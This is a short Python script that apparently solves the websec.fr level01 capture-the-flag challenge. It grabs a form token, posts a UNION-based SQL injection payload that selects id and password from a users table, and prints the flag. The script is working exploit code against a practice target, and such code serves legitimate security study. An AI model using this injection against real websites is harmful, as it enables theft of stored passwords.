#!/usr/bin/python3

import requests
import re

# DEFAULT INFO

url = "https://websec.fr/level01/index.php"

pattern = "(?<=value=\")(.*)(?=\">)"
flag_pattern = "(?<=WEBSEC{)(.*)(?=})"

pwn = requests.Session()
getToken = pwn.get(url)

token = re.search(pattern, getToken.text)[0]

# CHALLENGE

payload = "0 UNION SELECT id,password FROM users--"

headers = {"Cache-Control": "max-age=0", 
        "Sec-Ch-Ua": "\"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"", 
        "Sec-Ch-Ua-Mobile": "?0", 
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Upgrade-Insecure-Requests": "1", 
        "Origin": "https://websec.fr", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
        "Sec-Fetch-Site": "same-origin", 
        "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-User": "?1", 
        "Sec-Fetch-Dest": "document", 
        "Referer": "https://websec.fr/", 
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "es-ES,es;q=0.9"}

data = {"user_id": f"{payload}", 
        "submit": "Enviar", 
        "token": f"{token}"}

submit = pwn.post(url, headers=headers, data=data)

flag = "WEBSEC{" + re.search(flag_pattern, submit.text)[0] + "}"
print(flag)